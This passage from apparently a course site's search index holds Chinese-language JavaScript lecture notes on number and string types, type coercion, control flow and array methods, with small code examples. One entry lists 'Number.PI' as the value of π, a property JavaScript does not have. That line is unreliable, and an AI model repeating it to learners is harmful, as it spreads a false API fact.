\u4f4d\u6d6e\u70b9\u6570\uff08IEEE 754 \u6807\u51c6\uff09\u3002\uff08\u6ce8\u610f\uff1a<code>BigInt</code> \u662f\u7528\u4e8e\u4efb\u610f\u5927\u6574\u6570\u7684\u5355\u72ec\u7c7b\u578b\uff09\u3002</p> <ul> <li>Arithmetic Precision\uff1a\u7531\u4e8e\u6d6e\u70b9\u8868\u793a\uff0c\u8fdb\u884c\u7b97\u672f\u8fd0\u7b97\u65f6\u8981\u5c0f\u5fc3\uff0c\u56e0\u4e3a\u53ef\u80fd\u4f1a\u51fa\u73b0\u820d\u5165\u9519\u8bef\u3002</li> <li>Operators\uff1a</li> <li>\u6807\u51c6\uff1a<code>+</code>\u3001<code>-</code>\u3001<code>*</code>\u3001<code>/</code>\u3001<code>%</code> (modulo)</li> <li>increment/decrement\uff1a<code>++</code>\u3001<code>--</code></li> <li>compound assignment\uff1a<code>+=</code>\u3001<code>-=</code>\u3001<code>*=</code>\u3001<code>/=</code>\u3001<code>%=</code></li> <li>\u7279\u6b8a\u6570\u5b57\u503c (<code>Number</code> \u5bf9\u8c61\u7684\u5c5e\u6027)\uff1a</li> <li><code>Number.MAX_VALUE</code>\uff1a\u53ef\u8868\u793a\u7684\u6700\u5927\u6570\u5b57\u3002</li> <li><code>Number.MIN_VALUE</code>\uff1a\u53ef\u8868\u793a\u7684\u6700\u5c0f\u6b63\u6570\u3002</li> <li><code>Number.NaN</code>\uff1a \"Not a Number\" - \u8868\u793a\u65e0\u6548\u7684\u6570\u503c\u7ed3\u679c\u3002</li> <li><code>Number.POSITIVE_INFINITY</code>\u3001<code>Number.NEGATIVE_INFINITY</code>\uff1a\u8868\u793a Infinity\u3002</li> <li>Banana Skin\uff1a\u9664\u4ee5\u96f6\u4f1a\u5bfc\u81f4 <code>Infinity</code>\uff0c\u800c\u4e0d\u662f\u9519\u8bef\u3002</li> <li><code>Number.PI</code>\uff1a\u03c0 \u7684\u503c\u3002\uff08\u6570\u5b66\u5e38\u6570\u66f4\u5e38\u901a\u8fc7 <code>Math</code> \u5bf9\u8c61\u8bbf\u95ee\uff0c\u4f8b\u5982 <code>Math.PI</code>\uff09\u3002</li> <li>Math \u5bf9\u8c61\uff1a\u63d0\u4f9b\u9ad8\u7ea7\u6570\u5b66\u51fd\u6570\u548c\u5e38\u91cf\uff08\u4f8b\u5982\uff0c<code>Math.sin()</code>\u3001<code>Math.cos()</code>\uff09\u3002</li> <li><code>parseInt()</code>\uff1a\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6574\u6570\u3002\u5982\u679c\u5b57\u7b26\u4e32\u65e0\u6cd5\u8f6c\u6362\u4e3a\u6709\u6548\u7684\u6570\u5b57\uff0c<code>parseInt()</code> \u8fd4\u56de <code>NaN</code>\u3002</li> <li><code>NaN</code> (\"Not a Number\")\uff1a\u56e0\u65e0\u6548\u64cd\u4f5c\u800c\u8fd4\u56de\u3002</li> <li>Banana Skin\uff1a<code>NaN</code> \u5177\u6709\u201c\u4f20\u67d3\u6027\u201d\uff1a\u4efb\u4f55\u4ee5 <code>NaN</code> \u4f5c\u4e3a\u8f93\u5165\u7684\u6570\u5b66\u8fd0\u7b97\u4e5f\u5c06\u5bfc\u81f4 <code>NaN</code>\u3002</li> <li><code>isNaN()</code>\uff1a\u7528\u4e8e\u68c0\u67e5\u503c\u662f\u5426\u4e3a <code>NaN</code> \u7684\u5185\u7f6e\u51fd\u6570\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#352-strings","title":"3.5.2 Strings","text":"<p>\u5b57\u7b26\u4e32\u662f Unicode \u5b57\u7b26\u5e8f\u5217\u3002</p> <ul> <li>Literals\uff1a\u7528\u5355\u5f15\u53f7 (<code>'...'</code>) \u6216\u53cc\u5f15\u53f7 (<code>\"...\"</code>) \u754c\u5b9a\u3002</li> <li>Escaping Characters\uff1a\u5728\u5b57\u7b26\u4e32\u4e2d\u4f7f\u7528\u53cd\u659c\u6760 (<code>\\</code>) \u6765\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\uff1a<code>\\'</code>\u3001<code>\\\"</code>\u3001<code>\\\\</code>\u3001<code>\\n</code>\u3001<code>\\t</code>\u3002</li> <li>Empty String\uff1a<code>\"\"</code> \u6216 <code>''</code>\u3002</li> <li>No Character Data Type\uff1a\u5355\u4e2a\u5b57\u7b26\u8868\u793a\u4e3a\u957f\u5ea6\u4e3a 1 \u7684\u5b57\u7b26\u4e32\u3002</li> <li>Properties and Methods\uff1a</li> <li><code>length</code>\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u6570\u7684\u5c5e\u6027\u3002</li> <li>\u5e38\u7528\u65b9\u6cd5\u5305\u62ec\uff1a<code>charAt(index)</code>\u3001<code>indexOf(substring)</code>\u3001<code>substring(startIndex, endIndex)</code>\u3001<code>toLowerCase()</code>\u3001<code>toUpperCase()</code>\u3002</li> <li>String Concatenation\uff1a<code>+</code> operator \u8fde\u63a5\u5b57\u7b26\u4e32\u3002</li> <li>Implicit/Explicit conversion\uff1a\u4e00\u5143\u52a0\u53f7 <code>+</code> \u53ef\u7528\u4e8e\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4f8b\u5982\uff0c<code>+ \"123\"</code> \u53d8\u4e3a <code>123</code>\uff09\u3002</li> <li><code>toString()</code> \u65b9\u6cd5\u53ef\u4ee5\u5c06\u6570\u5b57\uff08\u6216\u5176\u4ed6\u7c7b\u578b\uff09\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#353-booleans","title":"3.5.3 Booleans","text":"<p>\u5177\u6709 <code>Boolean</code> \u7c7b\u578b\uff0c\u5b57\u9762\u503c\u4e3a <code>true</code> \u548c <code>false</code>\u3002</p> <ul> <li>Logical Operators\uff1a</li> <li>Logical NOT\uff1a<code>!</code></li> <li>Logical AND\uff1a<code>&amp;&amp;</code></li> <li>Logical OR\uff1a<code>||</code></li> <li><code>&amp;&amp;</code> \u548c <code>||</code> \u8fd0\u7b97\u7b26\u4f7f\u7528 short-circuit evaluation\uff1a\u4ec5\u5728\u5fc5\u8981\u65f6\u624d\u5bf9\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u6c42\u503c\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#354-null-undefined","title":"3.5.4 null \u548c undefined","text":"<p>Banana Skin\uff1a\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u503c\u6765\u8868\u793a\u6709\u610f\u4e49\u503c\u7684\u7f3a\u5931\uff0c\u8fd9\u53ef\u80fd\u4ee4\u4eba\u56f0\u60d1\u3002</p> <ul> <li><code>null</code>\uff1a\u8868\u793a\u6709\u610f\u7684\u975e\u503c\u6216\u201c\u7a7a\u201d\u503c\u3002\u5b83\u662f\u4e00\u4e2a\u8d4b\u503c\u3002</li> </ul> <ul> <li>undefined\uff1a\u610f\u5473\u7740\u53d8\u91cf\u5df2\u58f0\u660e\u4f46\u5c1a\u672a\u8d4b\u503c\uff0c\u6216\u8005\u6b63\u5728\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u53d8\u91cf\uff0c\u6216\u8005\u672a\u63d0\u4f9b\u51fd\u6570\u53c2\u6570\u3002</li> </ul> <p>\u5728\u5b9e\u8df5\u4e2d\uff0c\u4f60\u901a\u5e38\u4f1a\u6d4b\u8bd5 null\u3002\u610f\u5916\u9047\u5230 undefined \u53ef\u80fd\u8868\u793a\u5b58\u5728\u9519\u8bef\u3002</p>"},{"location":"cs/mern/3403/l5/#36-dynamic-typing-type-coercion","title":"3.6 Dynamic Typing \u548c Type Coercion","text":""},{"location":"cs/mern/3403/l5/#361-dynamic-typing","title":"3.6.1 Dynamic Typing","text":"<p>\u662f\u52a8\u6001\u7c7b\u578b\u7684\uff0c\u8fd9\u610f\u5473\u7740\u53d8\u91cf\u5728\u58f0\u660e\u65f6\u6ca1\u6709\u56fa\u5b9a\u7684\u5173\u8054\u7c7b\u578b\u3002</p> <p>\u4e00\u4e2a\u53d8\u91cf\u53ef\u4ee5\u5728\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684\u4e0d\u540c\u65f6\u95f4\u4fdd\u5b58\u4e0d\u540c\u7c7b\u578b\u7684\u503c\u3002</p> <pre><code>let value = 5;       // value \u662f\u4e00\u4e2a Number\nvalue = \"Hello\";   // value \u73b0\u5728\u662f\u4e00\u4e2a String\u3002\u6ca1\u6709\u9519\u8bef\u3002\n</code></pre> <ul> <li><code>typeof</code> operator\uff1a\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6307\u793a\u5176\u64cd\u4f5c\u6570\u7684\u5f53\u524d\u7c7b\u578b\u3002</li> <li><code>typeof null</code> \u8fd4\u56de <code>\"object\"</code> (\u8fd9\u662f\u4e00\u4e2a\u5386\u53f2\u9057\u7559\u7684\u602a\u7656)\u3002</li> <li><code>typeof function(){}</code> \u8fd4\u56de <code>\"function\"</code>\u3002</li> <li><code>typeof undefinedVariable</code> \u8fd4\u56de <code>\"undefined\"</code>\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#362-implicit-type-coercion","title":"3.6.2 Implicit Type Coercion","text":"<p>Banana Skin\uff1a\u5982\u679c\u7c7b\u578b\u4e0d\u540c\uff0c\u7ecf\u5e38\u5c1d\u8bd5\u81ea\u52a8\u5c06\u503c\u4ece\u4e00\u79cd\u7c7b\u578b\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u7c7b\u578b\u4ee5\u6267\u884c\u64cd\u4f5c\u3002\u8fd9\u79f0\u4e3a type coercion\uff0c\u53ef\u80fd\u5bfc\u81f4\u975e\u5e38\u4e0d\u76f4\u89c2\u4e14\u5bb9\u6613\u51fa\u9519\u7684\u884c\u4e3a\u3002</p> <ul> <li>\u671f\u671b <code>Number</code> \u65f6\u7684\u8f6c\u6362\uff1a</li> </ul> <ul> <li><code>true</code> \u53d8\u4e3a <code>1</code>\uff0c<code>false</code> \u53d8\u4e3a <code>0</code>\u3002</li> <li>\u5982\u679c\u5b57\u7b26\u4e32\u8868\u793a\u6709\u6548\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a\u6570\u5b57\uff1b\u5426\u5219\uff0c\u5b83\u4eec\u5c06\u53d8\u4e3a <code>NaN</code>\u3002</li> <li>\u6ce8\u610f\uff1a\u7a7a\u5b57\u7b26\u4e32 <code>''</code> \u8f6c\u6362\u4e3a <code>0</code>\uff0c\u800c\u4e0d\u662f <code>NaN</code>\uff01</li> <li><code>null</code> \u8f6c\u6362\u4e3a <code>0</code>\u3002</li> <li><code>undefined</code> \u8f6c\u6362\u4e3a <code>NaN</code>\u3002</li> </ul> <ul> <li>\u671f\u671b <code>String</code> \u65f6\u7684\u8f6c\u6362\uff1a</li> </ul> <ul> <li>\u6570\u5b57\u8f6c\u6362\u4e3a\u5176\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f\u3002</li> <li>\u5e03\u5c14\u503c\u8f6c\u6362\u4e3a <code>\"true\"</code> \u6216 <code>\"false\"</code>\u3002</li> <li><code>null</code> \u8f6c\u6362\u4e3a <code>\"null\"</code>\u3002</li> <li><code>undefined</code> \u8f6c\u6362\u4e3a <code>\"undefined\"</code>\u3002</li> </ul> <ul> <li>\u671f\u671b <code>Boolean</code> \u65f6\u7684\u8f6c\u6362 (Truthy/Falsy values)\uff1a</li> </ul> <ul> <li>Falsy \u503c (\u8f6c\u6362\u4e3a <code>false</code>)\uff1a<code>0</code>\u3001<code>-0</code>\u3001<code>NaN</code>\u3001<code>\"\"</code> (\u7a7a\u5b57\u7b26\u4e32)\u3001<code>null</code>\u3001<code>undefined</code>\u3002</li> <li>Truthy \u503c (\u6240\u6709\u5176\u4ed6\u503c\u90fd\u8f6c\u6362\u4e3a <code>true</code>)\uff1a\u4efb\u4f55\u975e\u96f6\u6570\u5b57\u3001\u4efb\u4f55\u975e\u7a7a\u5b57\u7b26\u4e32\u3001objects (\u5305\u62ec arrays \u548c functions)\u3002</li> </ul> <ul> <li>\u5f3a\u5236\u8f6c\u6362\u7684\u6709\u7528\u6848\u4f8b\uff08\u8c28\u614e\u4f7f\u7528\uff09\uff1a</li> </ul> <ul> <li> <p>\u5728\u8bbf\u95ee\u5c5e\u6027\u4e4b\u524d\u68c0\u67e5 <code>null</code>/<code>undefined</code> \u5bf9\u8c61\uff1a</p> <pre><code>var property = object &amp;&amp; object.getProperty(); // \u5982\u679c 'object' \u4e3a null/undefined\uff0c\u5219\u5176\u4e3a falsy\uff0c\u53d1\u751f\u77ed\u8def\u3002\n</code></pre> </li> </ul> <ul> <li> <p>\u8bbe\u7f6e\u9ed8\u8ba4\u503c\uff1a</p> <pre><code>let name = otherName || \"default\"; // \u5982\u679c 'otherName' \u4e3a falsy\uff0c\u5219 'name' \u53d8\u4e3a \"default\"\u3002\n</code></pre> </li> </ul> <ul> <li>Manual Coercion\uff1a\u53ef\u4ee5\u4f7f\u7528 <code>Number()</code>\u3001<code>String()</code> \u548c <code>Boolean()</code> \u51fd\u6570\u663e\u5f0f\u6267\u884c\u8fd9\u4e9b\u8f6c\u6362\uff0c\u8fd9\u901a\u5e38\u66f4\u6e05\u6670\u3002</li> </ul> <pre><code>Number(\"42\");    // 42\nString(123);   // \"123\"\nBoolean(\"\");   // false\n</code></pre>"},{"location":"cs/mern/3403/l5/#363-comparisons-coercion","title":"3.6.3 Comparisons \u548c Coercion","text":"<p>\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff08<code>&gt;</code>\u3001<code>&lt;</code>\u3001<code>&gt;=</code>\u3001<code>&lt;=</code>\u3001<code>==</code>\u3001<code>!=</code>\u3001<code>===</code>\u3001<code>!==</code>\uff09\u9002\u7528\u4e8e\u6570\u5b57\u548c\u5b57\u7b26\u4e32\u3002</p> <ul> <li>Loose Equality - <code>==</code> \u548c \u4e0d\u7b49 (<code>!=</code>)\uff1a</li> <li>Banana Skin\uff1a\u5982\u679c\u64cd\u4f5c\u6570\u7c7b\u578b\u4e0d\u540c\uff0c\u8fd9\u4e9b\u8fd0\u7b97\u7b26\u4f1a\u5728\u6bd4\u8f83\u5b83\u4eec\u4e4b\u524d\u6267\u884c\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u3002\u8fd9\u4f1a\u5bfc\u81f4\u8bb8\u591a\u4e0d\u76f4\u89c2\u7684\u7ed3\u679c\u3002</li> <li><code>1 == true</code> \u4e3a <code>true</code>\u3002</li> <li><code>'' == 0</code> \u4e3a <code>true</code>\u3002</li> <li>Non-Transitivity\uff1a\u4f7f\u7528 <code>==</code> \u7684\u76f8\u7b49\u6027\u4e0d\u5177\u6709\u4f20\u9012\u6027\u3002</li> <li>Strict Equality - <code>===</code> \u548c \u4e0d\u7b49 (<code>!==</code>)\uff1a</li> <li>Best Practice\uff1a\u4ec5\u5f53\u4e24\u4e2a\u64cd\u4f5c\u6570\u76f8\u7b49 \u4e14 \u7c7b\u578b\u76f8\u540c\u65f6\uff0c\u8fd9\u4e9b\u8fd0\u7b97\u7b26\u624d\u8fd4\u56de <code>true</code>\u3002\u4e0d\u6267\u884c\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u3002</li> <li><code>1 === true</code> \u4e3a <code>false</code>\u3002</li> <li>\u9ed8\u8ba4\u4f7f\u7528 <code>===</code> \u548c <code>!==</code>\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#364-type-coercion","title":"3.6.4 Type Coercion \u75af\u72c2\u793a\u4f8b","text":"<p>\u7531\u4e8e\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u800c\u4ea7\u751f\u7684\u4e00\u4e9b\u201c\u75af\u72c2\u201d\u7ed3\u679c\uff1a</p> <ul> <li>\u4f9d\u8d56\u4e8e\u8fd0\u7b97\u7b26\u7684\u5f3a\u5236\u8f6c\u6362\u65b9\u5411\uff1a</li> <li><code>2 - \"1\"</code> \u7ed3\u679c\u4e3a <code>1</code>\u3002</li> <li><code>2 + \"1\"</code> \u7ed3\u679c\u4e3a <code>\"21\"</code>\u3002</li> <li>\u610f\u5916\u7684 <code>NaN</code>\uff1a</li> <li><code>\"b\" + \"a\" + + \"a\" + \"a\"</code> \u7ed3\u679c\u4e3a <code>\"baNaNa\"</code>\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#37-control-structures","title":"3.7 Control Structures","text":"<p>\u652f\u6301\u7c7b\u4f3c\u4e8e C/C++/Java \u548c Python \u4e2d\u7684\u6807\u51c6\u63a7\u5236\u6d41\u8bed\u53e5\u3002</p>"},{"location":"cs/mern/3403/l5/#371-loops","title":"3.7.1 Loops","text":"<ul> <li><code>for</code> \u5faa\u73af (C-style)\uff1a</li> </ul> <pre><code>let triangle = 0;\nfor (let i = 1; i &lt;= 3; i++) {\n    triangle += i;\n}\n// triangle \u5c06\u4e3a 6\n</code></pre> <ul> <li><code>for...in</code> \u5faa\u73af\uff1a\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\uff08\u5305\u62ec\u6570\u7ec4\u7d22\u5f15\u6216\u5bf9\u8c61\u952e\uff09\u3002</li> </ul> <pre><code>// \u5bf9\u4e8e\u5bf9\u8c61\uff1a\nconst person = {fname: \"Quentin\", lname: \"Coldwater\", age: 30};\nlet text = \"\";\nfor (let x in person) { // x \u5c06\u662f \"fname\", \"lname\", \"age\"\n    text += person[x] + \" \";\n}\n// text \u53ef\u80fd\u4e3a \"Quentin Coldwater 30 \" (\u5bf9\u8c61\u5c5e\u6027\u7684\u987a\u5e8f\u4e0d\u4fdd\u8bc1)\n\n// \u5bf9\u4e8e\u6570\u7ec4 (\u904d\u5386\u7d22\u5f15)\uff1a\nconst arr = [\"a\", \"b\", \"c\"];\nfor (let index in arr) { // index \u5c06\u662f \"0\", \"1\", \"2\" (\u5b57\u7b26\u4e32!)\n    console.log(arr[index]);\n}\n</code></pre> <ul> <li><code>while</code> \u5faa\u73af\uff1a</li> </ul> <pre><code>let countdown = \"\";\nlet i = 3;\nwhile (i &gt;= 0) {\n    countdown += i + \"!\";\n    i--;\n}\n// countdown \u5c06\u4e3a \"3!2!1!0!\"\n</code></pre> <ul> <li><code>do...while</code> \u5faa\u73af\uff1a\u5728\u68c0\u67e5\u6761\u4ef6\u4e4b\u524d\u6267\u884c\u5faa\u73af\u4f53\u4e00\u6b21\u3002</li> </ul> <pre><code>let result = '';\nlet j = 0;\ndo {\n    j = j + 1;\n    result = result + j;\n} while (j &lt; 5);\n// result \u5c06\u4e3a \"12345\"\n</code></pre>"},{"location":"cs/mern/3403/l5/#372-conditional-statements","title":"3.7.2 Conditional Statements","text":"<ul> <li><code>if...else if...else</code> \u8bed\u53e5\uff1a</li> </ul> <pre><code>let greeting;\nlet time = new Date().getHours();\nif (time &lt; 10) {\n    greeting = \"Good morning\";\n} else if (time &lt; 20) {\n    greeting = \"Good day\";\n} else {\n    greeting = \"Good evening\";\n}\n</code></pre> <p>\u5373\u4f7f\u5bf9\u4e8e\u5355\u8bed\u53e5\u5757\uff0c\u901a\u5e38\u4e5f\u5efa\u8bae\u4f7f\u7528\u5927\u62ec\u53f7 <code>{}</code>\u3002</p> <ul> <li><code>switch</code> \u8bed\u53e5\uff1a\u6839\u636e\u8868\u8fbe\u5f0f\u7684\u503c\u63d0\u4f9b\u591a\u8def\u5206\u652f\u3002</li> </ul> <pre><code>let text;\nswitch (new Date().getDay()) { // getDay() \u8fd4\u56de 0 \u4ee3\u8868\u661f\u671f\u65e5\uff0c1 \u4ee3\u8868\u661f\u671f\u4e00\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002\n    case 0:\n        text = \"Today is Sunday\";\n        break; // \u91cd\u8981\uff0c\u9632\u6b62 fall-through\n    case 6:\n        text = \"Today is Saturday\";\n        break;\n    default: // \u53ef\u9009\n        text = \"Looking forward to the Weekend!\";\n}\n</code></pre> <ul> <li>Ternary Operator - <code>condition ? exprIfTrue : exprIfFalse</code>\uff1a\u7f16\u5199 <code>if-else</code> \u8868\u8fbe\u5f0f\u7684\u7b80\u6d01\u65b9\u6cd5\u3002</li> </ul> <pre><code>let isMember = true;\nlet price = isMember ? '$2.00' : '$10.00'; // price \u5c06\u4e3a '$2.00'\n</code></pre>"},{"location":"cs/mern/3403/l5/#4-arrays","title":"4. Arrays","text":"<p>\u4e2d\u7684\u6570\u7ec4\u662f\u52a8\u6001\u7684\u3001\u6709\u5e8f\u7684\u503c\u96c6\u5408\u3002\u5b83\u4eec\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684 object\u3002</p>"},{"location":"cs/mern/3403/l5/#41-array","title":"4.1 Array \u57fa\u7840","text":"<ul> <li>Definition\uff1a\u7531\u6570\u503c\u7d22\u5f15\u7684\u5143\u7d20\u5217\u8868\u3002</li> </ul> <ul> <li>Indexing\uff1a<code>Array</code> \u7d22\u5f15\u4ece 0 \u5f00\u59cb\u3002</li> </ul> <ul> <li><code>length</code> \u5c5e\u6027\uff1a<code>Array</code> \u7684 <code>length</code> \u6bd4\u6700\u9ad8\u7d22\u5f15\u5927\u4e00\u3002\u5b83\u4f1a\u52a8\u6001\u66f4\u65b0\u3002</li> </ul> <ul> <li>Dynamic Size\uff1a<code>Array</code> \u7684\u5927\u5c0f\u53ef\u4ee5\u5728\u521b\u5efa\u540e\u4fee\u6539\u3002</li> </ul> <ul> <li>Heterogeneous Elements\uff1a</li> </ul> <ul> <li>Banana Skin\uff1a<code>Array</code> \u7684\u5143\u7d20\u4e0d\u5fc5\u662f\u540c\u4e00\u7c7b\u578b\u3002</li> </ul> <pre><code>var person = []; // \u521b\u5efa\u4e00\u4e2a\u7a7a\u6570\u7ec4\nperson[0] = \"John\";\nperson[1] = \"Doe\";\nperson[2] = 46; // \u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u5305\u542b String\u3001String \u548c Number\n// person.length \u5c06\u4e3a 3\n// person[0] \u5c06\u8fd4\u56de \"John\"\n</code></pre> <ul> <li>Array \u5b57\u9762\u91cf (Square Bracket Notation)\uff1a\u521b\u5efa arrays \u6700\u5e38\u7528\u7684\u65b9\u6cd5\u3002</li> </ul> <pre><code>var fruits = [\"Banana\", \"Orange\", \"Apple\", \"Mango\"];\n</code></pre>"},{"location":"cs/mern/3403/l5/#42-array-constructor-method","title":"4.2 Array() Constructor Method","text":"<p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>Array()</code> \u6784\u9020\u51fd\u6570\u521b\u5efa arrays\uff0c\u4f46\u5176\u884c\u4e3a\u56e0\u53c2\u6570\u800c\u5f02\uff0c\u8fd9\u53ef\u80fd\u4ee4\u4eba\u56f0\u60d1\uff1a</p> <ul> <li>\u5355\u4e2a\u6570\u5b57\u53c2\u6570\uff1a<code>let a = new Array(10);</code> \u521b\u5efa\u4e00\u4e2a empty array\uff0c\u5176 <code>length</code> \u5c5e\u6027\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u6570\u5b57\u3002<code>Array</code> \u5143\u7d20\u6700\u521d\u662f undefined\u3002</li> <li>\u65e0\u53c2\u6570\uff1a<code>let b = new Array();</code> \u521b\u5efa\u4e00\u4e2a <code>length</code> \u4e3a 0 \u7684 empty array\u3002</li> <li>\u591a\u4e2a\u53c2\u6570\u6216\u5355\u4e2a\u975e\u6570\u5b57\u53c2\u6570\uff1a<code>let c = Array(10, 2, \"three\", \"four\");</code> \u521b\u5efa\u4e00\u4e2a\u4ee5\u6307\u5b9a\u53c2\u6570\u4f5c\u4e3a\u5176\u5143\u7d20\u7684 array\u3002</li> <li>Banana Skin\uff1a<code>Array(10)</code> \u521b\u5efa\u4e00\u4e2a\u957f\u5ea6\u4e3a 10 \u7684 empty array\uff0c\u4f46 <code>Array(10, 2)</code> \u521b\u5efa\u4e00\u4e2a array <code>[10, 2]</code>\uff0c\u957f\u5ea6\u4e3a 2\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#43-array","title":"4.3 \u8bbf\u95ee\u548c\u4fee\u6539 Array \u5143\u7d20","text":"<ul> <li>Iteration\uff1a</li> </ul> <ul> <li> <p>\u4f7f\u7528\u5e26\u6709 <code>length</code> \u5c5e\u6027\u7684\u6807\u51c6 <code>for</code> \u5faa\u73af\uff1a</p> <pre><code>let theBestFruits = [\"Banana\", \"Pomegranate\", \"Mulberry\", \"Pear\"];\nfor (let i = 0; i &lt; theBestFruits.length; i++) {\n    console.log(theBestFruits[i]);\n}\n</code></pre> </li> </ul> <ul> <li> <p>\u4f7f\u7528 <code>for...in</code> \u5faa\u73af\uff08\u5c06\u7d22\u5f15\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fed\u4ee3\uff09\uff1a</p> <pre><code>for (let fruitIndex in theBestFruits) { // fruitIndex \u5c06\u662f \"0\", \"1\", \"2\", \"3\"\n    console.log(theBestFruits[fruitIndex]);\n}\n</code></pre> <p>\uff08\u901a\u5e38\u9996\u9009 <code>for...of</code> (ES6) \u6765\u8fed\u4ee3 array \u503c\uff0c\u6216\u4f20\u7edf\u7684 <code>for</code> \u5faa\u73af\u6216\u50cf <code>forEach</code> \u8fd9\u6837\u7684 array \u65b9\u6cd5\u3002\uff09</p> </li> </ul> <ul> <li>Dynamic Length Modification\uff1a\u5206\u914d\u7ed9\u5927\u4e8e\u6216\u7b49\u4e8e\u5f53\u524d <code>length</code> \u7684\u7d22\u5f15\u4f1a\u589e\u52a0 array \u7684 <code>length</code>\u3002\u4e2d\u95f4\u7684\u4efb\u4f55\u5143\u7d20\u90fd\u5c06\u53d8\u4e3a undefined\u3002</li> </ul> <pre><code>theBestFruits[99] = \"Yuzu\"; // \u5982\u679c theBestFruits \u6709 4 \u4e2a\u5143\u7d20\uff0c\u5176\u957f\u5ea6\u73b0\u5728\u4e3a 100\u3002\n// \u7d22\u5f15 4 \u5230 98 \u7684\u5143\u7d20\u662f undefined\u3002\n</code></pre> <ul> <li>Accessing Non-existent Indices\uff1a</li> </ul> <ul> <li>Banana Skin\uff1a\u67e5\u8be2\u4e0d\u5b58\u5728\u7684 array \u7d22\u5f15\u5c06\u8fd4\u56de undefined\uff0c\u800c\u4e0d\u662f\u9519\u8bef\u3002</li> </ul> <pre><code>console.log(theBestFruits[102]); // \u5982\u679c\u7d22\u5f15 102 \u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de undefined\n</code></pre>"},{"location":"cs/mern/3403/l5/#44-array-methods","title":"4.4 Array \u65b9\u6cd5 (Methods)","text":"<p>Arrays \u5e26\u6709\u8bb8\u591a\u7528\u4e8e\u64cd\u4f5c\u7684\u5185\u7f6e\u65b9\u6cd5\u3002\u4e00\u4e9b\u5e38\u89c1\u7684\u65b9\u6cd5\u5305\u62ec\uff1a</p> <ul> <li><code>push(element1, ..., elementN)</code>\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u6dfb\u52a0\u5230 array \u7684\u672b\u5c3e\uff0c\u5e76\u8fd4\u56de\u65b0\u7684\u957f\u5ea6\u3002</li> <li><code>pop()</code>\uff1a\u4ece array \u4e2d\u5220\u9664\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002</li> <li><code>shift()</code>\uff1a\u4ece array \u4e2d\u5220\u9664\u7b2c\u4e00\u4e2a\u5143\u7d20\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002</li> <li><code>unshift(element1, ..., elementN)</code>\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u6dfb\u52a0\u5230 array \u7684\u5f00\u5934\uff0c\u5e76\u8fd4\u56de\u65b0\u7684\u957f\u5ea6\u3002</li> <li><code>join(separator)</code>\uff1a\u5c06 array \u7684\u6240\u6709\u5143\u7d20\u8fde\u63a5\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002</li> <li><code>reverse()</code>\uff1a\u5c31\u5730\u53cd\u8f6c array \u7684\u5143\u7d20\u3002</li> <li><code>sort(compareFunction)</code>\uff1a\u5c31\u5730\u5bf9 array \u7684\u5143\u7d20\u8fdb\u884c\u6392\u5e8f\u3002\u63a5\u53d7\u4e00\u4e2a\u53ef\u9009\u7684\u6bd4\u8f83\u5668\u51fd\u6570\u3002</li> <li><code>concat(array2, ..., arrayN)</code>\uff1a\u8fd4\u56de\u4e00\u4e2a\u65b0 array\uff0c\u7531\u8be5 array \u4e0e\u5176\u4ed6 array(\u548c/\u6216\u503c)\u8fde\u63a5\u800c\u6210\u3002</li> <li><code>slice(beginIndex, endIndex)</code>\uff1a\u5c06 array \u7684\u4e00\u90e8\u5206\u7684\u6d45\u62f7\u8d1d\u8fd4\u56de\u5230\u4e00\u4e2a\u65b0\u7684 array \u5bf9\u8c61\u4e2d\u3002</li> <li><code>splice(startIndex, deleteCount, item1, ..., itemN)</code>\uff1a\u901a\u8fc7\u5220\u9664\u6216\u66ff\u6362\u73b0\u6709\u5143\u7d20\u548c/\u6216\u5c31\u5730\u6dfb\u52a0\u65b0\u5143\u7d20\u6765\u66f4\u6539 array \u7684\u5185\u5bb9\u3002</li> <li><code>delete array[index]</code>\uff1a\u901a\u8fc7\u5c06\u5176\u503c\u8bbe\u7f6e\u4e3a undefined \u4ece array \u4e2d\u5220\u9664\u5143\u7d20\uff08\u7559\u4e0b\u4e00\u4e2a\u7a7a\u69fd\uff09\u3002\u8fd9\u4e0d\u4f1a\u66f4\u6539 array \u7684\u957f\u5ea6\u6216\u91cd\u65b0\u7d22\u5f15\u540e\u7eed\u5143\u7d20\u3002</li> 